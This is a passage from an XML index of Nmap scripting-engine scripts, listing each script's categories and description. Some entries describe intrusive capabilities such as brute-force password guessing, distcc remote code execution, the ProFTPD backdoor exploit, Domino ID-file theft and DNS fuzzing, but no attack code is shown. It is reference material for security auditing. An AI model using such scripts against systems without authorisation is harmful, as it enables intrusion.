<description>Analyzes the clock skew between the scanner and various services that report timestamps.&#xa;&#xa;At the end of the scan, it will show groups of systems that have similar median&#xa;clock skew among their services. This can be used to identify targets with&#xa;similar configurations, such as those that share a common time server.&#xa;&#xa;You must run at least 1 of the following scripts to collect clock data:&#xa;* bitcoin-info&#xa;* http-date&#xa;* http-ntlm-info&#xa;* imap-ntlm-info&#xa;* memcached-info&#xa;* ms-sql-ntlm-info&#xa;* nntp-ntlm-info&#xa;* ntp-info&#xa;* openwebnet-discovery&#xa;* pop3-ntlm-info&#xa;* rfc868-time&#xa;* smb-os-discovery&#xa;* smb-security-mode&#xa;* smb2-time&#xa;* smb2-vuln-uptime&#xa;* smtp-ntlm-info&#xa;* ssl-date&#xa;* telnet-ntlm-info&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\coap-resources.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Dumps list of available resources from CoAP endpoints.&#xa;&#xa;This script establishes a connection to a CoAP endpoint and performs a&#xa;GET request on a resource. The default resource for our request is&#xa;&lt;code&gt;/.well-known/core&lt;/core&gt;, which should contain a list of&#xa;resources provided by the endpoint.&#xa;&#xa;For additional information:&#xa;* https://en.wikipedia.org/wiki/Constrained_Application_Protocol&#xa;* https://tools.ietf.org/html/rfc7252&#xa;* https://tools.ietf.org/html/rfc6690&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\couchdb-databases.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Gets database tables from a CouchDB database.&#xa;&#xa;For more info about the CouchDB HTTP API, see&#xa;http://wiki.apache.org/couchdb/HTTP_database_API.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\couchdb-stats.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Gets database statistics from a CouchDB database.&#xa;&#xa;For more info about the CouchDB HTTP API and the statistics, see&#xa;http://wiki.apache.org/couchdb/Runtime_Statistics&#xa;and&#xa;http://wiki.apache.org/couchdb/HTTP_database_API.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\creds-summary.nse">
<categories><category>auth</category><category>default</category><category>safe</category></categories>
<description>Lists all discovered credentials (e.g. from brute force and default password checking scripts) at end of scan.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cups-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Lists printers managed by the CUPS printing service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cups-queue-info.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Lists currently queued print jobs of the remote CUPS service grouped by&#xa;printer.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cvs-brute-repository.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Attempts to guess the name of the CVS repositories hosted on the remote server.&#xa;With knowledge of the correct repository name, usernames and passwords can be guessed.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\cvs-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against CVS pserver authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\daap-get-library.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves a list of music from a DAAP server. The list includes artist&#xa;names and album and song titles.&#xa;&#xa;Output will be capped to 100 items if not otherwise specified in the&#xa;&lt;code&gt;daap_item_limit&lt;/code&gt; script argument. A&#xa;&lt;code&gt;daap_item_limit&lt;/code&gt; below zero outputs the complete contents of&#xa;the DAAP library.&#xa;&#xa;Based on documentation found here:&#xa;http://www.tapjam.net/daap/.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\daytime.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Retrieves the day and time from the Daytime service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\db2-das-info.nse">
<categories><category>safe</category><category>discovery</category><category>version</category></categories>
<description>Connects to the IBM DB2 Administration Server (DAS) on TCP or UDP port 523 and&#xa;exports the server profile.  No authentication is required for this request.&#xa;&#xa;The script will also set the port product and version if a version scan is&#xa;requested.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\deluge-rpc-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the DelugeRPC daemon.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dhcp-discover.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Sends a DHCPINFORM request to a host on UDP port 67 to obtain all the local configuration parameters&#xa;without allocating a new address.&#xa;&#xa;DHCPINFORM is a DHCP request that returns useful information from a DHCP server, without allocating an IP&#xa;address. The request sends a list of which fields it wants to know (a handful by default, every field if&#xa;verbosity is turned on), and the server responds with the fields that were requested. It should be noted&#xa;that the server doesn&apos;t have to return every field, nor does it have to return them in the same order,&#xa;or honour the request at all. A Linksys WRT54g, for example, completely ignores the list of requested&#xa;fields and returns a few standard ones. This script displays every field it receives.&#xa;&#xa;With script arguments, the type of DHCP request can be changed, which can lead to interesting results.&#xa;Additionally, the MAC address can be randomized, which in should override the cache on the DHCP server and&#xa;assign a new IP address. Extra requests can also be sent to exhaust the IP address range more quickly.&#xa;&#xa;Some of the more useful fields:&#xa;* DHCP Server (the address of the server that responded)&#xa;* Subnet Mask&#xa;* Router&#xa;* DNS Servers&#xa;* Hostname&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dicom-brute.nse">
<categories><category>auth</category><category>brute</category></categories>
<description>Attempts to brute force the Application Entity Title of a DICOM server (DICOM Service Provider).&#xa;&#xa;Application Entity Titles (AET) are used to restrict responses only to clients knowing the title. Hence,&#xa; the called AET is used as a form of password.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dicom-ping.nse">
<categories><category>discovery</category><category>default</category><category>safe</category><category>auth</category></categories>
<description>Attempts to discover DICOM servers (DICOM Service Provider) through a partial C-ECHO request.&#xa; It also detects if the server allows any called Application Entity Title or not.&#xa;&#xa;The script responds with the message &quot;Called AET check enabled&quot; when the association request&#xa; is rejected due configuration. This value can be bruteforced.&#xa;&#xa;C-ECHO requests are commonly known as DICOM ping as they are used to test connectivity.&#xa;Normally, a &apos;DICOM ping&apos; is formed as follows:&#xa;* Client -&gt; A-ASSOCIATE request -&gt; Server&#xa;* Server -&gt; A-ASSOCIATE ACCEPT/REJECT -&gt; Client&#xa;* Client -&gt; C-ECHO request -&gt; Server&#xa;* Server -&gt; C-ECHO response -&gt; Client&#xa;* Client -&gt; A-RELEASE request -&gt; Server&#xa;* Server -&gt; A-RELEASE response -&gt; Client&#xa;&#xa;For this script we only send the A-ASSOCIATE request and look for the success code&#xa; in the response as it seems to be a reliable way of detecting DICOM servers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dict-info.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Connects to a dictionary server using the DICT protocol, runs the SHOW&#xa;SERVER command, and displays the result. The DICT protocol is defined in RFC&#xa;2229 and is a protocol which allows a client to query a dictionary server for&#xa;definitions from a set of natural language dictionary databases.&#xa;&#xa;The SHOW server command must be implemented and depending on access will show&#xa;server information and accessible databases. If authentication is required, the&#xa;list of databases will not be shown.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\distcc-cve2004-2687.nse">
<categories><category>exploit</category><category>intrusive</category><category>vuln</category></categories>
<description>Detects and exploits a remote code execution vulnerability in the distributed&#xa;compiler daemon distcc. The vulnerability was disclosed in 2002, but is still&#xa;present in modern implementation due to poor configuration of the service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-blacklist.nse">
<categories><category>external</category><category>safe</category></categories>
<description>Checks target IP addresses against multiple DNS anti-spam and open&#xa;proxy blacklists and returns a list of services for which an IP has been flagged.  Checks may be limited by service category (eg: SPAM,&#xa;PROXY) or to a specific service name.  </description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-brute.nse">
<categories><category>intrusive</category><category>discovery</category></categories>
<description>Attempts to enumerate DNS hostnames by brute force guessing of common&#xa;subdomains. With the &lt;code&gt;dns-brute.srv&lt;/code&gt; argument, dns-brute will also&#xa;try to enumerate common DNS SRV records.&#xa;&#xa;Wildcard records are listed as &quot;*A&quot; and &quot;*AAAA&quot; for IPv4 and IPv6 respectively.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-cache-snoop.nse">
<categories><category>intrusive</category><category>discovery</category></categories>
<description>Performs DNS cache snooping against a DNS server.&#xa;&#xa;There are two modes of operation, controlled by the&#xa;&lt;code&gt;dns-cache-snoop.mode&lt;/code&gt; script argument. In&#xa;&lt;code&gt;nonrecursive&lt;/code&gt; mode (the default), queries are sent to the&#xa;server with the RD (recursion desired) flag set to 0. The server should&#xa;respond positively to these only if it has the domain cached. In&#xa;&lt;code&gt;timed&lt;/code&gt; mode, the mean and standard deviation response times&#xa;for a cached domain are calculated by sampling the resolution of a name&#xa;(www.google.com) several times. Then, each domain is resolved and the&#xa;time taken compared to the mean. If it is less than one standard&#xa;deviation over the mean, it is considered cached. The &lt;code&gt;timed&lt;/code&gt;&#xa;mode inserts entries in the cache and can only be used reliably once.&#xa;&#xa;The default list of domains to check consists of the top 50 most popular&#xa;sites, each site being listed twice, once with &quot;www.&quot; and once without.&#xa;Use the &lt;code&gt;dns-cache-snoop.domains&lt;/code&gt; script argument to use a&#xa;different list.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-check-zone.nse">
<categories><category>discovery</category><category>safe</category><category>external</category></categories>
<description>Checks DNS zone configuration against best practices, including RFC 1912.&#xa;The configuration checks are divided into categories which each have a number&#xa;of different tests.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-client-subnet-scan.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Performs a domain lookup using the edns-client-subnet option which&#xa;allows clients to specify the subnet that queries supposedly originate&#xa;from.  The script uses this option to supply a number of&#xa;geographically distributed locations in an attempt to enumerate as&#xa;many different address records as possible. The script also supports&#xa;requests using a given subnet.&#xa;&#xa;* https://tools.ietf.org/html/rfc7871&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-fuzz.nse">
<categories><category>fuzzer</category><category>intrusive</category></categories>
<description>Launches a DNS fuzzing attack against DNS servers.&#xa;&#xa;The script induces errors into randomly generated but valid DNS packets.&#xa;The packet template that we use includes one uncompressed and one&#xa;compressed name.&#xa;&#xa;Use the &lt;code&gt;dns-fuzz.timelimit&lt;/code&gt; argument to control how long the&#xa;fuzzing lasts. This script should be run for a long time. It will send a&#xa;very large quantity of packets and thus it&apos;s pretty invasive, so it&#xa;should only be used against private DNS servers as part of a software&#xa;development lifecycle.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-ip6-arpa-scan.nse">
<categories><category>intrusive</category><category>discovery</category></categories>
<description>Performs a quick reverse DNS lookup of an IPv6 network using a technique&#xa;which analyzes DNS server response codes to dramatically reduce the number of queries needed to enumerate large networks.&#xa;&#xa;The technique essentially works by adding an octet to a given IPv6 prefix&#xa;and resolving it. If the added octet is correct, the server will return&#xa;NOERROR, if not a NXDOMAIN result is received.&#xa;&#xa;The technique is described in detail on Peter&apos;s blog:&#xa;http://7bits.nl/blog/2012/03/26/finding-v6-hosts-by-efficiently-mapping-ip6-arpa&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-nsec-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Enumerates DNS names using the DNSSEC NSEC-walking technique.&#xa;&#xa;Output is arranged by domain. Within a domain, subzones are shown with&#xa;increased indentation.&#xa;&#xa;The NSEC response record in DNSSEC is used to give negative answers to&#xa;queries, but it has the side effect of allowing enumeration of all&#xa;names, much like a zone transfer. This script doesn&apos;t work against&#xa;servers that use NSEC3 rather than NSEC; for that, see&#xa;&lt;code&gt;dns-nsec3-enum&lt;/code&gt;.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-nsec3-enum.nse">
<categories><category>discovery</category><category>intrusive</category></categories>
<description>Tries to enumerate domain names from the DNS server that supports DNSSEC&#xa;NSEC3 records.&#xa;&#xa;The script queries for nonexistant domains until it exhausts all domain&#xa;ranges keeping track of hashes. At the end, all hashes are printed along&#xa;with salt and number of iterations used. This technique is known as&#xa;&quot;NSEC3 walking&quot;.&#xa;&#xa;That info should then be fed into an offline cracker, like&#xa;&lt;code&gt;unhash&lt;/code&gt; from https://dnscurve.org/nsec3walker.html, to&#xa;bruteforce the actual names from the hashes. Assuming that the script&#xa;output was written into a text file &lt;code&gt;hashes.txt&lt;/code&gt; like:&#xa;&lt;code&gt;&#xa;domain example.com&#xa;salt 123456&#xa;iterations 10&#xa;nexthash d1427bj0ahqnpi4t0t0aaun18oqpgcda vhnelm23s1m3japt7gohc82hgr9un2at&#xa;nexthash k7i4ekvi22ebrim5b6celtaniknd6ilj prv54a3cr1tbcvqslrb7bftf5ji5l0p8&#xa;nexthash 9ool6bk7r2diaiu81ctiemmb6n961mph nm7v0ig7h9c0agaedc901kojfj9bgabj&#xa;nexthash 430456af8svfvl98l66shhrgucoip7mi mges520acstgaviekurg3oksh9u31bmb&#xa;&lt;/code&gt;&#xa;&#xa;Run this command to recover the domain names:&#xa;&lt;code&gt;&#xa;# ./unhash &lt; hashes.txt &gt; domains.txt&#xa;names: 8&#xa;d1427bj0ahqnpi4t0t0aaun18oqpgcda ns.example.com.&#xa;found 1 private NSEC3 names (12%) using 235451 hash computations&#xa;k7i4ekvi22ebrim5b6celtaniknd6ilj vulpix.example.com.&#xa;found 2 private NSEC3 names (25%) using 35017190 hash computations&#xa;&lt;/code&gt;&#xa;&#xa;Use the &lt;code&gt;dns-nsec-enum&lt;/code&gt; script to handle servers that use NSEC&#xa;rather than NSEC3.&#xa;&#xa;References:&#xa;* https://dnscurve.org/nsec3walker.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-nsid.nse">
<categories><category>discovery</category><category>default</category><category>safe</category></categories>
<description>Retrieves information from a DNS nameserver by requesting&#xa;its nameserver ID (nsid) and asking for its id.server and&#xa;version.bind values. This script performs the same queries as the following&#xa;two dig commands:&#xa;  - dig CH TXT bind.version @target&#xa;  - dig +nsid CH TXT id.server @target&#xa;&#xa;References:&#xa;[1]http://www.ietf.org/rfc/rfc5001.txt&#xa;[2]http://www.ietf.org/rfc/rfc4892.txt&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-random-srcport.nse">
<categories><category>external</category><category>intrusive</category></categories>
<description>Checks a DNS server for the predictable-port recursion vulnerability.&#xa;Predictable source ports can make a DNS server vulnerable to cache poisoning&#xa;attacks (see CVE-2008-1447).&#xa;&#xa;The script works by querying porttest.dns-oarc.net (see&#xa;https://www.dns-oarc.net/oarc/services/porttest).  Be aware that any&#xa;targets against which this script is run will be sent to and&#xa;potentially recorded by one or more DNS servers and the porttest&#xa;server. In addition your IP address will be sent along with the&#xa;porttest query to the DNS server running on the target.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-random-txid.nse">
<categories><category>external</category><category>intrusive</category></categories>
<description>Checks a DNS server for the predictable-TXID DNS recursion&#xa;vulnerability.  Predictable TXID values can make a DNS server vulnerable to&#xa;cache poisoning attacks (see CVE-2008-1447).&#xa;&#xa;The script works by querying txidtest.dns-oarc.net (see&#xa;https://www.dns-oarc.net/oarc/services/txidtest).  Be aware that any&#xa;targets against which this script is run will be sent to and&#xa;potentially recorded by one or more DNS servers and the txidtest&#xa;server. In addition your IP address will be sent along with the&#xa;txidtest query to the DNS server running on the target.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-recursion.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Checks if a DNS server allows queries for third-party names. It is&#xa;expected that recursion will be enabled on your own internal&#xa;nameservers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-service-discovery.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to discover target hosts&apos; services using the DNS Service Discovery protocol.&#xa;&#xa;The script first sends a query for _services._dns-sd._udp.local to get a&#xa;list of services. It then sends a followup query for each one to try to&#xa;get more information.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-srv-enum.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Enumerates various common service (SRV) records for a given domain name.&#xa;The service records contain the hostname, port and priority of servers for a given service.&#xa;The following services are enumerated by the script:&#xa;  - Active Directory Global Catalog&#xa;  - Exchange Autodiscovery&#xa;  - Kerberos KDC Service&#xa;  - Kerberos Passwd Change Service&#xa;  - LDAP Servers&#xa;  - SIP Servers&#xa;  - XMPP S2S&#xa;  - XMPP C2S&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-update.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Attempts to perform a dynamic DNS update without authentication.&#xa;&#xa;Either the &lt;code&gt;test&lt;/code&gt; or both the &lt;code&gt;hostname&lt;/code&gt; and&#xa;&lt;code&gt;ip&lt;/code&gt; script arguments are required. Note that the &lt;code&gt;test&lt;/code&gt;&#xa;function will probably fail due to using a static zone name that is not the&#xa;zone configured on your target.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-zeustracker.nse">
<categories><category>safe</category><category>discovery</category><category>external</category><category>malware</category></categories>
<description>Checks if the target IP range is part of a Zeus botnet by querying ZTDNS @ abuse.ch.&#xa;Please review the following information before you start to scan:&#xa;* https://zeustracker.abuse.ch/ztdns.php&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dns-zone-transfer.nse">
<categories><category>intrusive</category><category>discovery</category></categories>
<description>Requests a zone transfer (AXFR) from a DNS server.&#xa;&#xa;The script sends an AXFR query to a DNS server. The domain to query is&#xa;determined by examining the name given on the command line, the DNS&#xa;server&apos;s hostname, or it can be specified with the&#xa;&lt;code&gt;dns-zone-transfer.domain&lt;/code&gt; script argument. If the query is&#xa;successful all domains and domain types are returned along with common&#xa;type specific data (SOA/MX/NS/PTR/A).&#xa;&#xa;This script can run at different phases of an Nmap scan:&#xa;* Script Pre-scanning: in this phase the script will run before any&#xa;Nmap scan and use the defined DNS server in the arguments. The script&#xa;arguments in this phase are: &lt;code&gt;dns-zone-transfer.server&lt;/code&gt; the&#xa;DNS server to use, can be a hostname or an IP address and must be&#xa;specified. The &lt;code&gt;dns-zone-transfer.port&lt;/code&gt; argument is optional&#xa;and can be used to specify the DNS server port.&#xa;* Script scanning: in this phase the script will run after the other&#xa;Nmap phases and against an Nmap discovered DNS server. If we don&apos;t&#xa;have the &quot;true&quot; hostname for the DNS server we cannot determine a&#xa;likely zone to perform the transfer on.&#xa;&#xa;Useful resources&#xa;* DNS for rocket scientists: http://www.zytrax.com/books/dns/&#xa;* How the AXFR protocol works: http://cr.yp.to/djbdns/axfr-notes.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\docker-version.nse">
<categories><category>version</category></categories>
<description>Detects the Docker service version.</description>
</script>
<script filename="E:\Software\Nmap/scripts\domcon-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against the Lotus Domino Console.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\domcon-cmd.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Runs a console command on the Lotus Domino Console using the given authentication credentials (see also: domcon-brute)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\domino-enum-users.nse">
<categories><category>intrusive</category><category>auth</category></categories>
<description>Attempts to discover valid IBM Lotus Domino users and download their ID files by exploiting the CVE-2006-5835 vulnerability.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\dpap-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against an iPhoto Library.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\drda-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs password guessing against databases supporting the IBM DB2 protocol such as Informix, DB2 and Derby&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\drda-info.nse">
<categories><category>safe</category><category>discovery</category><category>version</category></categories>
<description>Attempts to extract information from database servers supporting the DRDA&#xa;protocol. The script sends a DRDA EXCSAT (exchange server attributes)&#xa;command packet and parses the response.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\duplicates.nse">
<categories><category>safe</category></categories>
<description>Attempts to discover multihomed systems by analysing and comparing&#xa;information collected by other scripts. The information analyzed&#xa;currently includes, SSL certificates, SSH host keys, MAC addresses,&#xa;and Netbios server names.&#xa;&#xa;In order for the script to be able to analyze the data it has dependencies to&#xa;the following scripts: ssl-cert,ssh-hostkey,nbtstat.&#xa;&#xa;One or more of these scripts have to be run in order to allow the duplicates&#xa;script to analyze the data.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\eap-info.nse">
<categories><category>broadcast</category><category>safe</category></categories>
<description>Enumerates the authentication methods offered by an EAP (Extensible&#xa;Authentication Protocol) authenticator for a given identity or for the&#xa;anonymous identity if no argument is passed.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\enip-info.nse">
<categories><category>discovery</category><category>version</category></categories>
<description>This NSE script is used to send a EtherNet/IP packet to a remote device that&#xa;has TCP 44818 open. The script will send a Request Identity Packet and once a&#xa;response is received, it validates that it was a proper response to the command&#xa;that was sent, and then will parse out the data. Information that is parsed&#xa;includes Device Type, Vendor ID, Product name, Serial Number, Product code,&#xa;Revision Number, status, state, as well as the Device IP.&#xa;&#xa;This script was written based of information collected by using the the&#xa;Wireshark dissector for CIP, and EtherNet/IP, The original information was&#xa;collected by running a modified version of the ethernetip.py script&#xa;(https://github.com/paperwork/pyenip)&#xa;&#xa;http://digitalbond.com&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\epmd-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Connects to Erlang Port Mapper Daemon (epmd) and retrieves a list of nodes with their respective port numbers.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\eppc-enum-processes.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Attempts to enumerate process info over the Apple Remote Event protocol.&#xa;When accessing an application over the Apple Remote Event protocol the&#xa;service responds with the uid and pid of the application, if it is running,&#xa;prior to requesting authentication.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\fcrdns.nse">
<categories><category>discovery</category><category>safe</category></categories>
<description>Performs a Forward-confirmed Reverse DNS lookup and reports anomalous results.&#xa;&#xa;References:&#xa;* https://en.wikipedia.org/wiki/Forward-confirmed_reverse_DNS&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\finger.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Attempts to retrieve a list of usernames using the finger service.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\fingerprint-strings.nse">
<categories><category>version</category></categories>
<description>Prints the readable strings from service fingerprints of unknown services.&#xa;&#xa;Nmap&apos;s service and application version detection engine sends named probes to&#xa;target services and tries to identify them based on the response. When there is&#xa;no match, Nmap produces a service fingerprint for submission. Sometimes,&#xa;inspecting this fingerprint can give clues as to the identity of the service.&#xa;However, the fingerprint is encoded and wrapped to ensure it doesn&apos;t lose data,&#xa;which can make it hard to read.&#xa;&#xa;This script simply unwraps the fingerprint and prints the readable ASCII strings&#xa;it finds below the name of the probe it responded to. The probe names are taken&#xa;from the nmap-service-probes file, not from the response.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\firewalk.nse">
<categories><category>safe</category><category>discovery</category></categories>
<description>Tries to discover firewall rules using an IP TTL expiration technique known&#xa;as firewalking.&#xa;&#xa;To determine a rule on a given gateway, the scanner sends a probe to a metric&#xa;located behind the gateway, with a TTL one higher than the gateway. If the probe&#xa;is forwarded by the gateway, then we can expect to receive an ICMP_TIME_EXCEEDED&#xa;reply from the gateway next hop router, or eventually the metric itself if it is&#xa;directly connected to the gateway. Otherwise, the probe will timeout.&#xa;&#xa;It starts with a TTL equals to the distance to the target. If the probe timeout,&#xa;then it is resent with a TTL decreased by one. If we get an ICMP_TIME_EXCEEDED,&#xa;then the scan is over for this probe.&#xa;&#xa;Every &quot;no-reply&quot; filtered TCP and UDP ports are probed. As for UDP scans, this&#xa;process can be quite slow if lots of ports are blocked by a gateway close to the&#xa;scanner.&#xa;&#xa;Scan parameters can be controlled using the &lt;code&gt;firewalk.*&lt;/code&gt;&#xa;optional arguments.&#xa;&#xa;From an original idea of M. Schiffman and D. Goldsmith, authors of the&#xa;firewalk tool.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\firewall-bypass.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Detects a vulnerability in netfilter and other firewalls that use helpers to&#xa;dynamically open ports for protocols such as ftp and sip.&#xa;&#xa;The script works by spoofing a packet from the target server asking for opening&#xa;a related connection to a target port which will be fulfilled by the firewall&#xa;through the adequate protocol helper port. The attacking machine should be on&#xa;the same network segment as the firewall for this to work. The script supports&#xa;ftp helper on both IPv4 and IPv6. Real path filter is used to prevent such&#xa;attacks.&#xa;&#xa;Based on work done by Eric Leblond.&#xa;&#xa;For more information, see:&#xa;&#xa;* http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\flume-master-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Retrieves information from Flume master HTTP pages.&#xa;&#xa;Information gathered:&#xa;* Flume version&#xa;* Flume server id&#xa;* Zookeeper/Hbase master servers present in configured flows&#xa;* Java information&#xa;* OS information&#xa;* various other local configurations.&#xa;&#xa;If this script is run wth -v, it will output lots more info.&#xa;&#xa;Use the &lt;code&gt;newtargets&lt;/code&gt; script argument to add discovered hosts to&#xa;the Nmap scan queue.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\fox-info.nse">
<categories><category>discovery</category><category>version</category></categories>
<description>Tridium Niagara Fox is a protocol used within Building Automation Systems. Based&#xa;off Billy Rios and Terry McCorkle&apos;s work this Nmap NSE will collect information&#xa;from A Tridium Niagara system.&#xa;&#xa;http://digitalbond.com&#xa;&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\freelancer-info.nse">
<categories><category>default</category><category>discovery</category><category>safe</category><category>version</category></categories>
<description>Detects the Freelancer game server (FLServer.exe) service by sending a&#xa;status query UDP probe.&#xa;&#xa;When run as a version detection script (&lt;code&gt;-sV&lt;/code&gt;), the script&#xa;will report on the server name, current number of players, maximum&#xa;number of players, and whether it has a password set. When run&#xa;explicitly (&lt;code&gt;-&#45;script freelancer-info&lt;/code&gt;), the script will&#xa;additionally report on the server description, whether players can harm&#xa;other players, and whether new players are allowed.&#xa;&#xa;See http://sourceforge.net/projects/gameq/&#xa;(relevant files: games.ini, packets.ini, freelancer.php)&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-anon.nse">
<categories><category>default</category><category>auth</category><category>safe</category></categories>
<description>Checks if an FTP server allows anonymous logins.&#xa;&#xa;If anonymous is allowed, gets a directory listing of the root directory&#xa;and highlights writeable files.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-bounce.nse">
<categories><category>default</category><category>safe</category></categories>
<description>Checks to see if an FTP server allows port scanning using the FTP bounce method.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-brute.nse">
<categories><category>intrusive</category><category>brute</category></categories>
<description>Performs brute force password auditing against FTP servers.&#xa;&#xa;Based on old ftp-brute.nse script by Diman Todorov, Vlatko Kosturjak and Ron Bowes.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-libopie.nse">
<categories><category>vuln</category><category>intrusive</category></categories>
<description>Checks if an FTPd is prone to CVE-2010-1938 (OPIE off-by-one stack overflow),&#xa;a vulnerability discovered by Maksymilian Arciemowicz and Adam &quot;pi3&quot; Zabrocki.&#xa;See the advisory at https://nmap.org/r/fbsd-sa-opie.&#xa;Be advised that, if launched against a vulnerable host, this script will crash the FTPd.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-proftpd-backdoor.nse">
<categories><category>exploit</category><category>intrusive</category><category>malware</category><category>vuln</category></categories>
<description>Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID&#xa;45150. This script attempts to exploit the backdoor using the innocuous&#xa;&lt;code&gt;id&lt;/code&gt; command by default, but that can be changed with the&#xa;&lt;code&gt;ftp-proftpd-backdoor.cmd&lt;/code&gt; script argument.&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-syst.nse">
<categories><category>default</category><category>discovery</category><category>safe</category></categories>
<description>Sends FTP SYST and STAT commands and returns the result.&#xa;&#xa;The canonical SYST response of &quot;UNIX Type: L8&quot; is stripped or ignored, since it&#xa;is meaningless. Typical FTP response codes (215 for SYST and 211 for STAT) are&#xa;also hidden.&#xa;&#xa;References:&#xa;* https://cr.yp.to/ftp/syst.html&#xa;</description>
</script>
<script filename="E:\Software\Nmap/scripts\ftp-vsftpd-backdoor.nse">
<categories><category>exploit</category><category>intrusive</category><category>malware</category><category>vuln</category></categories>
